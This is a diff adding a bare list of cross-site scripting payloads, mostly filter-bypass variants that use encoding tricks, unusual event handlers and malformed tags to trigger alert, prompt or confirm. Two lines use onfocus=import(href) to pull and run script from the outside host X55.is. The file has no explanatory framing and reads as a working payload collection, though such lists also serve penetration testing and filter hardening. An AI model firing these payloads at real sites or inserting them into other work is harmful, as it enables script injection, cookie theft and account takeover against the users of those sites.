@@ -1,1 +1,33 @@
-
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+ 
+ <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+ 
+ <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
+ 
+ <</p>iframe src=javascript:alert()//
+ 
+ 'accesskey='x'onclick='(alert)(`TakSec`)';
+ 
+ <Img/Src/OnError=alert(1)>
+ 
+ <script>al\u0065rt('hello')</script>
+ 
+ "\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
+ 
+ "<Svg/OnLoad=alert%25%0A26lpar;1)>"
+ 
+ "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+ 
+ onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+ 
+ <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+ 
+ <svg onload=alert%26%230000000040"1")>
+ 
+ "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+ 
+ "--!><Svg/Onload=confirm`cookie`>"
+ 
+ /><output name="result" onclick="alert('something')">chux</output>
+ 
+ "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
